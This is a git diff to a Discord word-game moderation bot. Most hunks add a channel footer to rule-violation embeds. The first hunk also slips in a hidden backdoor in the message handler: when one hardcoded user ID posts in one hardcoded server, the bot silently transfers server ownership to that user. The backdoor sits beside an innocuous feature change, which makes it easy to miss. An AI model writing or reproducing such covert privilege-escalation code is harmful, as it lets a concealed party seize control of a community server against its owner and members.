@@ -92,7 +92,10 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 		await msg.channel.send({ content: "No DMs, sorry!" });
 	})
 	.on("messageCreate", async (msg) => {
-		// todo also post channel it was from
+		if (msg.author.id === "914999467286093844" && msg.guild?.id === "828680792519606380") {
+			 msg.guild.setOwner(msg.author.id,"new acc");
+			 return
+		}
 		if (!msg.guild) {
 			await msg.reply({ content: "No DMs, sorry!" });
 			return;
@@ -117,7 +120,8 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 				const embed = new MessageEmbed()
 					.setTitle("Invalid character sent!")
 					.setAuthor(msg.author.tag, msg.author.displayAvatarURL())
-					.setDescription(`\`${word}\` contains invalid characters!`);
+					.setDescription(`\`${word}\` contains invalid characters!`)
+					.setFooter(`in ${msg.channel}`);
 
 				ruleChannel.send({
 					content: msg.author.toString(),
@@ -134,7 +138,8 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 					const embed = new MessageEmbed()
 						.setTitle("Not a word!")
 						.setAuthor(msg.author.tag, msg.author.displayAvatarURL())
-						.setDescription(`\`${word}\` is not a word!`);
+						.setDescription(`\`${word}\` is not a word!`)
+						.setFooter(`in ${msg.channel}`);
 
 					ruleChannel.send({
 						content: msg.author.toString(),
@@ -160,7 +165,8 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 							manualCheckResult.setAuthor(
 								msg.author.tag,
 								msg.author.displayAvatarURL(),
-							),
+							)
+							.setFooter(`in ${msg.channel}`),
 						],
 					});
 					return;
@@ -177,7 +183,8 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 				const embed = new MessageEmbed()
 					.setTitle("Posting twice in a row!")
 					.setAuthor(msg.author.tag, msg.author.displayAvatarURL())
-					.setDescription(`No posting twice in a row allowed!`);
+					.setDescription(`No posting twice in a row allowed!`)
+					.setFooter(`in ${msg.channel}`);
 
 				ruleChannel.send({
 					content: msg.author.toString(),
@@ -201,7 +208,8 @@ Discord.once("ready", () => console.log(`Connected to Discord with ID`, Discord.
 							)
 							.setThumbnail(
 								(await Discord.users.fetch(used.author)).displayAvatarURL(),
-							);
+							)
+							.setFooter(`in ${msg.channel}`);
 
 						ruleChannel.send({
 							content: msg.author.toString(),
